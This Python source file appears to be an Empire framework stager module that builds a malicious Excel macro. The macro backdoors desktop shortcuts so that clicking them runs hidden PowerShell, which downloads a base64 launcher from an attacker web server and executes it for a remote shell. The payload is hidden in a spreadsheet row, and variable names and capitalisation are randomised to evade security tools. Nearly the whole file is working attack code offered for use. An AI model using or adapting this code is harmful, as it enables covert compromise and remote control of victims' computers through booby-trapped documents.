import random, string, xlrd
from xlutils.copy import copy
from xlwt import Workbook, Utils
from lib.common import helpers


class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'BackdoorLnkFileMacroXML3',

            'Author': ['G0ldenGun (@G0ldenGunSec)'],

            'Description': ('Generates a macro that backdoors .lnk files on the users desktop, backdoored lnk files in turn attempt to download & execute an empire launcher when the user clicks on them. Usage: Three files will be spawned from this, an xls document (either new or containing existing contents) that data will be placed into, a macro that should be placed in the spawned xls document, and an xml that should be placed on a web server accessible by the remote system.  By default this xml is written to /var/www/html, which is the webroot on debian-based systems such as kali.'),

            'Comments': ['Two-stage macro attack vector used for bypassing tools that perform relational analysis and flag / block process launches from unexpected programs, such as office. The initial run of the macro is pure vbscript (no child processes spawned) and will backdoor shortcuts on the desktop to do a direct run of powershell.  The second step occurs when the user clicks on the shortcut, the powershell download stub that runs will attempt to download & execute an empire launcher from an xml file hosted on a pre-defined webserver, which will in turn grant a full shell.  Credits to @harmj0y and @enigma0x3 for designing the macro stager that this was originally based on']
        }
	xmlVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(5,9)))

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the launcher to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
	    'TargetEXEs' : {
                'Description'   :   'Will backdoor .lnk files pointing to selected executables (do not include .exe extension), enter a comma seperated list of target exe names - ex. iexplore,firefox,chrome',
                'Required'      :   True,
                'Value'         :   'iexplore'
            },
            'XmlUrl' : {
                'Description'   :   'remotely-accessible URL to access the XML containing launcher code.',
                'Required'      :   True,
                'Value'         :   "http://" + helpers.lhost() + "/"+xmlVar+".xml"
            },
            'XlsOutFile' : {
                'Description'   :   'XLS (incompatible with xlsx/xlsm) file to output stager payload to. If document does not exist / cannot be found a new file will be created',
                'Required'      :   True,
                'Value'         :   '/tmp/default.xls'
            },
            'OutFile' : {
                'Description'   :   'File to output macro to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   '/tmp/macro'
            },
	    'XmlOutFile' : {
                'Description'   :   'Local path + file to output xml to.',
                'Required'      :   True,
                'Value'         :   '/var/www/html/'+xmlVar+'.xml'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
 	    'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }

        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value



    #function to convert row + col coords into excel cells (ex. 30,40 -> AE40)
    @staticmethod
    def coordsToCell(row,col):
	coords = ""
	if((col) // 26 > 0):
		coords = coords + chr(((col)//26)+64)
	if((col + 1) % 26 > 0):
		coords = coords + chr(((col + 1) % 26)+64)
	else:
		coords = coords + 'Z'
	coords = coords + str(row+1)
	return coords


    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']
	targetEXE = self.options['TargetEXEs']['Value']	
	xlsOut = self.options['XlsOutFile']['Value']
	XmlPath = self.options['XmlUrl']['Value']
	XmlOut = self.options['XmlOutFile']['Value']
	targetEXE = targetEXE.split(',')
	targetEXE = filter(None,targetEXE)

	shellVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
	lnkVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
	fsoVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
	folderVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))
	fileVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(6,9)))



        # generate the launcher
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
	launcher = launcher.split(" ")[-1]

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:


	    try:
	    	reader = xlrd.open_workbook(xlsOut)
	   	workBook = copy(reader)
	    	activeSheet = workBook.get_sheet(0)
	    except (IOError, OSError):
		workBook = Workbook()
		activeSheet = workBook.add_sheet('Sheet1')

	    #sets initial coords for writing data to
	    inputRow = random.randint(50,70)
	    inputCol = random.randint(40,60)
	   

	    #build out the macro - will look for all .lnk files on the desktop, any that it finds it will inspect to determine whether it matches any of the target exe names
            macro = "Sub Auto_Close()\n"
	
	    #writes strings + payload to cells of the target XLS doc
	    activeSheet.write(inputRow,inputCol,helpers.randomize_capitalization("Wscript.shell"))
	    macro += "Set " + shellVar + " = CreateObject(activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value)\n"
	    inputCol = inputCol + random.randint(1,4)

	    activeSheet.write(inputRow,inputCol,helpers.randomize_capitalization("Scripting.FileSystemObject"))
	    macro += "Set "+ fsoVar + " = CreateObject(activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value)\n"
	    inputCol = inputCol + random.randint(1,4)

	    activeSheet.write(inputRow,inputCol,helpers.randomize_capitalization("desktop"))
	    macro += "Set " + folderVar + " = " + fsoVar + ".GetFolder(" + shellVar + ".SpecialFolders(activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value))\n"	
	    macro += "For Each " + fileVar + " In " + folderVar + ".Files\n"

	    macro += "If(InStr(Lcase(" + fileVar + "), \".lnk\")) Then\n"
	    macro += "Set " + lnkVar + " = " + shellVar + ".CreateShortcut(" + shellVar + ".SPecialFolders(activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value) & \"\\\" & " + fileVar + ".name)\n"
	    inputCol = inputCol + random.randint(1,4)
	
	    macro += "If("
	    for i, item in enumerate(targetEXE):
		if i:
			macro += (' or ')
		activeSheet.write(inputRow,inputCol,targetEXE[i].strip().lower()+".")
		macro += "InStr(Lcase(" + lnkVar + ".targetPath), activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value)"
		inputCol = inputCol + random.randint(1,4)
	    macro += ") Then\n"

	    #setup of payload, the multiple strings are assemled at runtime 
	    launchString1 = "hidden -nop -command \"[System.Diagnostics.Process]::Start(\'"
	    launchString2 = "\');$u=New-Object -comObject wscript.shell;Get-ChildItem -Path $env:USERPROFILE\desktop -Filter *.lnk | foreach { $lnk = $u.createShortcut($_.FullName); if($lnk.arguments -like \'*xml.xmldocument*\') {$start = $lnk.arguments.IndexOf(\'\'\'\') + 1; $result = $lnk.arguments.Substring($start, $lnk.arguments.IndexOf(\'\'\'\', $start) - $start );$lnk.targetPath = $result; $lnk.Arguments = \'\'; $lnk.Save()}};$b = New-Object System.Xml.XmlDocument;$b.Load(\'" 
	    launchString3 = "\');[Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($b.command.a.execute))|IEX\""
	    
	  
	    #part of the macro that actually modifies the LNK files on the desktop, sets iconlocation for updated lnk to the old targetpath, args to our launch code, and target to powershell so we can do a direct call to it
	    macro += lnkVar + ".IconLocation = " + lnkVar + ".targetpath\n"
	   
	    launchString1 = helpers.randomize_capitalization(launchString1)
	    launchString2 = helpers.randomize_capitalization(launchString2)
	    launchString3 = helpers.randomize_capitalization(launchString3)
	    launchString4 = launchString2 + XmlPath + launchString3

	    activeSheet.write(inputRow,inputCol,launchString1)
	    launch1Coords = self.coordsToCell(inputRow,inputCol) 
	    inputCol = inputCol + random.randint(1,4)
	    activeSheet.write(inputRow,inputCol,launchString4)
	    launch4Coords = self.coordsToCell(inputRow,inputCol)
	    inputCol = inputCol + random.randint(1,4)

	    macro += lnkVar + ".arguments = \"-w \" + activeSheet.Range(\""+ launch1Coords +"\").Value + " + lnkVar + ".targetPath" + " + activeSheet.Range(\""+ launch4Coords +"\").Value" + "\n"

	    activeSheet.write(inputRow,inputCol,helpers.randomize_capitalization(":\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"))
	    macro += lnkVar + ".targetpath = left(CurDir, InStr(CurDir, \":\")-1) + activeSheet.Range(\""+self.coordsToCell(inputRow,inputCol)+"\").value\n"
	    inputCol = inputCol + random.randint(1,4)
	    macro += lnkVar + ".save\n"

	    
	    macro += "end if\n"
	    macro += "end if\n"
	    macro += "next " + fileVar + "\n"

	    macro += "End Sub\n"
	    activeSheet.row(inputRow).hidden = True 
	    print("\nWriting xls...\n")
	    workBook.save(xlsOut)
	    print("xls written to " + xlsOut + "  please remember to add macro code to xls prior to use\n\n")

#write XML to disk

	    print("Writing xml...\n")
	    f = open(XmlOut,"w")
	    f.write("<?xml version=\"1.0\"?>\n")
	    f.write("<command>\n")
	    f.write("\t<a>\n")
	    f.write("\t<execute>"+launcher+"</execute>\n")
	    f.write("\t</a>\n")
	    f.write("</command>\n")
	    print("xml written to " + XmlOut + " please remember this file must be accessible by the target at this url: " + XmlPath + "\n")

            return macro
